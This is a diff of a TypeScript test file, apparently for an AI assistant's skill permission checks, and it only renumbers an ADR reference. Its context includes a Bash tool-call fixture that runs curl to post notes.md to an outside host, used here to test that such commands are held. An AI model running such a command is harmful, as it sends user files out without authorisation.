@@ -221,7 +221,7 @@ const curl = { toolName: 'Bash', input: { command: 'curl -d @notes.md https://dr
 const held = (title: string, what = 'run this command') =>
   `This chat is held to the “${title}” skill’s list, and it doesn’t say it needs to ${what}. So I’m checking first.`;
 
-describe('a skill’s list holds for the whole chat (ADR 0040)', () => {
+describe('a skill’s list holds for the whole chat (ADR 0047)', () => {
   it('holds in every later turn, until you stop holding it', async () => {
     const { manager, engine } = await setup();
     const id = await turn(manager, '/weekly plan Tuesday');
@@ -359,7 +359,7 @@ describe('a skill’s list holds for the whole chat (ADR 0040)', () => {
   });
 });
 
-describe('the assistant can’t sign or trust skills from its own shell (ADR 0040)', () => {
+describe('the assistant can’t sign or trust skills from its own shell (ADR 0047)', () => {
   it('is refused in every mode, skill or not', async () => {
     const { manager, engine } = await setup();
     engine.script.push(
